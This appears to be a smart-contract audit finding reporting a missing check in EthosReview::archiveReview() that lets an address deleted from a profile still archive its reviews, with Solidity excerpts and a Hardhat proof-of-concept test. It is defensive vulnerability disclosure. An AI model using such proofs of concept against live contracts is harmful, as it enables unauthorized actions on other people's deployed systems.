# A missing check in `EthosReview::archiveReview()` allows deleted addresses to archive reviews

## Summary

When archiving a review, there is no check to verify if the `msg.sender` is deleted or marked as compromised.

As a result, a compromised address can still archive a review even if it has been deleted.

## Vulnerability Detail

In the `EthosReview::addReview()` function, the `author` of the review is set as the address that called the function.

```solidity
  function addReview(
    Score score,
    address subject,
    address paymentToken,
    string calldata comment,
    string calldata metadata,
    AttestationDetails calldata attestationDetails
  ) external payable whenNotPaused {
    ... ...
    reviews[reviewCount] = Review({
      archived: false,
      score: score,
      authorProfileId: authorProfileId,
      author: msg.sender,
      subject: subject,
      reviewId: reviewCount,
      // solhint-disable-next-line not-rely-on-time
      createdAt: block.timestamp,
      comment: comment,
      metadata: metadata,
      attestationDetails: attestationDetails
    });
    ... ...
  }
```

In the `EthosReview::archiveReview()` function, a check ensures that the calling address is the `author`.

```solidity
  function archiveReview(uint256 reviewId) external whenNotPaused {
    ... ...
    if (review.author != msg.sender) {
      revert UnauthorizedArchiving(reviewId);
    }
    ... ...
  }
```

However, it is not checked whether the `author` has been deleted beforehand.
This means that a compromised address will still be able to archive any review it has added.

### PoC

The following test should be added in `EthosReview.test.ts`:

```javascript

    it('should set review as archived if address has been deleted', async () => {
      const { ethosReview, ADMIN, REVIEW_CREATOR_0, REVIEW_SUBJECT_0, OWNER, ethosProfile, OTHER_0, EXPECTED_SIGNER, } =
        await loadFixture(deployFixture);

      const reviewPrice = ethers.parseEther('1.23456789');
      await allowPaymentToken(ADMIN, ethosReview, ethers.ZeroAddress, true, reviewPrice);

      const params = {
        score: Score.Positive,
        subject: REVIEW_SUBJECT_0.address,
        paymentToken: ethers.ZeroAddress,
        comment: defaultComment,
        metadata: defaultMetadata,
        attestationDetails: {
          account: '',
          service: '',
        } satisfies AttestationDetails,
      };

      const profileId = String(2);
      let rand = '123';
      let signature = await common.signatureForRegisterAddress(
        OTHER_0.address,
        profileId,
        rand,
        EXPECTED_SIGNER,
      );

      await ethosProfile.connect(OWNER).inviteAddress(REVIEW_CREATOR_0.address);
      await ethosProfile.connect(REVIEW_CREATOR_0).createProfile(1);
      await ethosProfile
        .connect(REVIEW_CREATOR_0)
        .registerAddress(OTHER_0.address, profileId, rand, signature);

      let addresses = await ethosProfile.addressesForProfile(2);
      expect(addresses.length).to.be.equal(2, 'should be 2 addresses');

      await ethosReview
        .connect(REVIEW_CREATOR_0)
        .addReview(
          params.score,
          params.subject,
          params.paymentToken,
          params.comment,
          params.metadata,
          params.attestationDetails,
          { value: reviewPrice },
        );

      let review = await ethosReview.reviews(0);
      expect(review.archived).to.equal(false, 'wrong before');

      await ethosProfile.connect(OTHER_0).deleteAddressAtIndex(0);

      addresses = await ethosProfile.addressesForProfile(2);
      expect(addresses.length).to.be.equal(1, 'should be 1 address');
      expect(addresses[0]).to.be.equal(OTHER_0.address, 'wrong address[0]');

      await ethosReview.connect(REVIEW_CREATOR_0).archiveReview(0);

      review = await ethosReview.reviews(0);
      expect(review.archived).to.equal(true, 'wrong after');
    });
```

### Impact

A compromised address can archive any review made by that address even if it has been deleted from the profile.
